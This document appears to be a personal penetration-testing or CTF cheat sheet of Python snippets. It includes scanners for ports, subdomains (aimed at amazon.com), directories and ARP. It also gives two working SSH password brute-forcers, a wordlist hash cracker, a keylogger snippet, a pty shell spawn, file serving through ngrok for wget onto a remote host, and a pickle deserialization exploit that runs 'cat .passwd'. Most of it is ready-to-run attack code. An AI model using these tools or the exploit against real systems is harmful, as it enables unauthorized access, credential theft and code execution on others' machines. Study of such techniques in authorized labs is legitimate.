# Libraries
### Requests
```python
import requests
response = requests.get(url)
print(response.text)
print(response.status_code)
print(response.cookies)
```

```python
resp = requests.post(url, cookies={'admin':'value'})
```

### Os
```python
import os
os.system("ls")
```

### Pty
```python
# Open a shell prompt
import pty
pty.spawn("/bin/bash")
```

### Hashlib
```python
hash = hashlib.md5("password".encode()).hexdigest()
hash = hashlib.sha256("password".encode()).hexdigest()
```

### Socket
```python
import socket
import time

# Open the communication
s = socket.socket()
s.connect(('target', port))
time.sleep(1)

counter = 0
while True:
    time.sleep(0.2)
    output = s.recv(2048).decode()
    print(output)
    if "What do you want to eat ?" in output : 
	    ret = "Some chicken"
	    s.send(ret.encode()+b"\n")
```

### Scapy

### Sys

### Paramiko 
- Paramiko is an SSHv2 implementation

# WebServer

## On premise
```bash
python -m http.server 9000
```

***It may be necessary to disable firewalls :*** 
```bash
sudo ufw allow from 10.10.227.247 proto tcp to any port 9000
```

## On remote machine : 

```bash
wget http://IP/file.name
```

We can forward the local port with ngrok to access it over all the internet.  
(it equires another terminal)

```bash
ngrok http 9000
```

```bash
wget <full ngrok given https address>
```

Ngrok addresses look like : https://4348-2a01-e0a-6e-dd60-4b76-ce7b-d8b-d846.eu.ngrok.io

# Basics

##### Convert to .exe
**Tools** : 
- Py2exe
- ...

### Subdomain enumeration 
```python
import requests

def main(wordlist, domain):
	with open(wordlist) as w :
		content = w.read()
	paths = content.split("\n")
	for line in paths :
		uri = f"http://{line}.{domain}"
		try :
			resp = requests.get(uri)
			print(f"{resp.status_code} : {uri}")
		except :
			pass

if __name__ == '__main__' :
	wordlist = "./wordlist.txt"
	domain = 'amazon.com'
	main(wordlist,domain)
```

### Directory enumeration
```python
import requests

def main(wordlist, url):
	with open(wordlist) as w :
		content = w.read()
	paths = content.split("\n")
	for line in paths :
		uri = f"{url}{line}.html"
		resp = requests.get(uri)
		if (resp.status_code == 200 ) :
			print(f"{resp.status_code} : {uri}")
	
if __name__ == '__main__' :
	wordlist = "./wordlist.txt"
	url = 'http://10.10.168.28/'
	main(wordlist,url)
```


### Network scanner

```python
 # Using ARP requests
from scapy.all import *

interface = "docker0"
ip_range = "172.17.0.1/16"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range)

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
	print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))
```

### Port scanner
```python
import socket

def main(target):
	ports = range(1,65535)
	open_ports = []
	for port in ports :
		print(f"{port} : yet, open ports are : {open_ports}")
		try :
			sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			sock.settimeout(0.5)
			resp = sock.connect_ex((target,port))
			if resp == 0 :
				print(f"Port {port} is open")
				open_ports.append(port)
		except :
			pass
		sock.close()
  
if __name__ == '__main__' :
	target = "localhost"
	main(target)
```

### SSH Bruteforcer

```python
def is_ssh_open(hostname, username, password):
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        # this is when host is unreachable
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        # sleep for a minute
        time.sleep(60)
        return is_ssh_open(hostname, username, password)
    else:
        # connection was established successfully
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")

    # parse passed arguments
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user
    # read the file
    passlist = open(passlist).read().splitlines()
    # brute-force
    for password in passlist:
        if is_ssh_open(host, user, password):
            # if combo is valid, save it to a file
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break
```

### Hash cracker

```python
import hashlib

def main(hash,wordlist,format) :
	with open(wordlist) as w :
		passwds = w.read()
	passwds = passwds.split("\n")
	for password in passwds :
		if format == 'SHA256' :
			tmp_hash = hashlib.sha256(password.encode()).hexdigest()
			if tmp_hash == hash :
				print(f"hash cracked, password found : {password}")
				exit()
		elif format == 'MD5' :
			tmp_hash = hashlib.md5(password.encode()).hexdigest()
			if tmp_hash == hash :
				print(f"hash cracked, password found : {password}")
				exit()
	print("Hash not cracked")
  
if __name__ == '__main__' :
	hash = 'cd13b6a6af66fb774faa589a9d18f906'
	format = 'MD5'
	wordlist = "./wordlist2.txt"
	main(hash,wordlist,format)
```

### Keylogger

```python
import keyboard
keys = keyboard.record(until ='ENTER')
# for key in keys :
#	  print(key)
keyboard.play(keys)
```

### SSH Bruteforcer

```python
import paramiko

def main(target,port,username, wordlist) :
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	with open(wordlist) as w :
		content = w.read()
	passwords = content.split("\n")
	for password in passwords :
		try :
			ssh.connect(target,port=port,username=username,password=password)
			print(f"Password found for user {username} : {password}")
			exit()
		except :
			print(f"Auth failed with {username}:{password}")
			pass
		ssh.close()
	print(f"No password found for user {username}")

if __name__ == '__main__' :
	target = "10.10.168.28"
	port = 22
	username = "tiffany"
	wordlist = "./wordlist2.txt"
	main(target,port,username, wordlist)
```

# Pickle

Pickle is a library used to serialize and unserialize data.
A vulnerability exists because when unpickling, it calls the `__reduce__` function and the code is interpreted

**Serialize**
```python
import pickle
pickle.dumps(['pickle', 'me', 1, 2, 3])
```
Output :
```python
b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.'
```

**Unserialize**
```python
import pickle
pickle.loads(b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.')
```
Output
```
['pickle', 'me', 1, 2, 3]
```

### Pickle exploit example
Be careful, depending on the version of python used by the server, it can sometimes fail to loads even if the load data is valid
```python
import pickle, os, base64
class P(object):
	def __reduce__(self):
		return (os.system,("cat .passwd",))

payloadb64 = base64.b64encode(pickle.dumps(P()))

# print(payloadb64)
payload = base64.b64decode(payloadb64)

# print(payload)
pickle.loads(payload)
```

Pickle uses different `protocols` to convert your data to a binary stream.

- In python 2 there are [3 different protocols](https://docs.python.org/2/library/pickle.html#data-stream-format) (`0`, `1`, `2`) and the default is `0`.
- In python 3 there are [5 different protocols](https://docs.python.org/3/library/pickle.html#data-stream-format) (`0`, `1`, `2`, `3`, `4`) and the default is `3`.
```python
pickle.dump(your_object, your_file, protocol=2)
```

You must specify in python 3 a protocol lower than `3` in order to be able to load the data in python 2. You can specify the `protocol` parameter when invoking [`pickle.dump`](https://docs.python.org/2/library/pickle.html#pickle.dump).